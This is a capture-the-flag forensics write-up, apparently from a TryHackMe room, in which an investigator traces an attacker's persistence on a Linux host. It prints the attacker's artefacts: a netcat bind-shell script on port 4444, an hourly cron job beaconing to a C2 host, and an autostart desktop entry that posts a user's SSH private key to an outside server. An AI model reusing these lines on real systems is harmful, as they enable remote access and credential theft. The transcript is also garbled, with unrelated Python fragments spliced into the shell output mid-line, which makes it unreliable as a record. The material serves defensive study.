## Objetivo
Perform thorough process and application analysis to identify an attacker's persistence methods.
## Solución
investigator@tryhackme:~$ export PATH=/mnt/usb/bin:/mnt/usb/sbin
investigator@tryhackme:~$ export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt
/usb/lib64
investigator@tryhackme:~$ check-env
THM{8c860435f00c943c21f6b6e0f1b2f854}
investigator@tryhackme:~$ 
investigator@tryhackme:~$ cat /home/janice/abzkd83o4jakxld.sh 
#!/bin/bash

# Set the path to the lock file
LOCKFILE="/tmp/abzkd83o4jakxld.lock"

# Check if lock file exists
if [ -e "$LOCKFILE" ]; then
    echo "Script is already running. Exiting."
    exit 1
fi

# Create lock file
touch "$LOCKFILE"

# Main command
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 
0.0.0.0 4444 > /tmp/f

# Remove lock file
rm -f "$LOCKFILE"
investigator@tryhackme:~$ 
investigator@tryhackme:~$ sudo systemctl list-units --all --type=se
rvice
[sudo] password for investigator: 
  UNIT                                           LOAD      ACTIVE >
  accounts-daemon.service                        loaded    active >
  acpid.service                                  loaded    active >
  alsa-restore.service                           loaded    inactiv>
  alsa-state.service                             loaded    inactiv>
  anacron.service                                loaded    inactiv>
  apparmor.service                               loaded    active >
  apport-autoreport.service                      loaded    inactiv>
  apport.service                                 loaded    active >
  apt-daily-upgrade.service                      loaded    inactiv>
  apt-daily.service                              loaded    inactiv>
  atd.service                                    loaded    active >
● auditd.service                                 not-found inactiv>
  avahi-daemon.service                           loaded    active >
  b4ckd00rftw.service                            loaded    active >
  B64.service                                    loaded    active >
  badr.service                                   loaded    active >
  blk-availability.service                       loaded    active >
  blueman-mechanism.service                      loaded    inactiv>
  cloud-config.service                           loaded    active >
  cloud-final.service                            loaded    active >
  cloud-init-hotplugd.service                    loaded    inactiv>
  cloud-init-local.service                       loaded    active >
  cloud-init.service                             loaded    active >
● connman.service                                not-found inactiv>
● console-screen.service                         not-found inactiv>
  console-setup.service                          loaded    active >
  cron.service                                   loaded    active >
  cups-browsed.service                           loaded    active >
  cups.service                                   loaded    active >
  dbus.service                                   loaded    active >
  dm-event.service                               loaded    inactiv>
  dmesg.service                                  loaded    inactiv>
  e2scrub_all.service                            loaded    inactiv>
  e2scrub_reap.service                           loaded    inactiv>
lines 1-35
investigator@tryhackme:~$ ls -la
total 168
drwxr-xr-x  5 investigator investigator   4096 Jun  6 09:58 .
drwxr-xr-x 11 root         root           4096 Mar 13  2024 ..
-rw-------  1 investigator investigator     55 Jun  6 09:58 .Xautho
rity
-rw-------  1 investigator investigator   3775 Mar 13  2024 .bash_h
istory
-rw-r--r--  1 investigator investigator    220 Mar 12  2024 .bash_l
ogout
-rw-r--r--  1 investigator investigator   3771 Mar 12  2024 .bashrc
drwxrwxr-x  3 investigator investigator   4096 Jun  6 09:58 .cache
drwx------  4 investigator investigator   4096 Nov  7 19:02 .config
drwx------  3 investigator investigator   4096 Mar 13  2024 .local
-rw-r--r--  1 investigator investigator    807 Mar 12  2024 .profil
e
-rw-r--r--  1 investigator investigator      0 Mar 12  2024 .sudo_a
s_admin_successful
-rw-rw-r--  1 investigator investigator    222 Mar 13  2024 .wget-h
sts
-rw-rw-r--  1 investigator investigator 126903 Mar 13  2024 dumpzil
la.py
investigator@tryhackme:~$ 
investigator@tryhackme:~$ cat /etc/cron.hourly/beacon
#!/bin/bash

curl http://c2.intelligent-software.thm:8310/beacon
investigator@tryhackme:~$ cd /home/janice/.config/autostart/
investigator@tryhackme:/home/janice/.config/autostart$ ls -la
total 12ng "+filename : mime.from_file(file).decode('unicode-escape')}
drwxrwxr-x 2 janice janice 4096 Mar 13  2024 .
drwxrwxr-x 3 janice janice 4096 Mar 13  2024 ..
-rw-rw-r-- 1 janice janice  189 Mar 13  2024 keygrabber.desktop
investigator@tryhackme:/home/janice/.config/autostart$ cat keygrab
ber.desktop 
[Desktop Entry]
Type=Application
Name=Standard Desktop Configuration (DO NOT MODIFY)
Exec=/bin/bash -c "curl -X POST -d '/home/janice/.ssh/id_rsa' httpte from "+directory)
://aabab.best-it-services.thm/id_rsa"
investigator@tryhackme:/home/janice/.config/autostart$ 
investigator@tryhackme:/home/janice/.config/autostart$ ls -a /homee_ext_extraction_dict
/*/.config/autostart
/home/eduardo/.config/autostart:#################################################
.  ..  dev.desktop                                                #
#################################################
/home/franklin/.config/autostart:
.  ..  netwk.desktop

/home/janice/.config/autostart:
.  ..  keygrabber.desktop
investigator@tryhackme:/home/janice/.config/autostart$ ls -a /home
/*/.config/autostart/netwk.desktop]
/home/franklin/.config/autostart/netwk.desktop
investigator@tryhackme:/home/janice/.config/autostart$ 
       if dir.find("Roaming") > -1:
